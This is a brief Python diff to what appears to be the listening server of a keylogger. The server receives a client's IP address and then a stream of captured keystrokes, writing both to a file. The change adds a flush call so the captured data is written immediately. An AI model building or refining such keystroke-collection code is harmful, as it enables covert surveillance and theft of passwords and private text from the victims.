@@ -16,6 +16,7 @@ try:
         ip_address_bytes = client_socket.recv(1024)
         ip_address = ip_address_bytes.decode('utf-8')
         f.write(f"Client IP Address: {ip_address}\n\n")
+        f.flush()  # Ensure data is written immediately
 
         # Receive and write keystrokes
         while True:
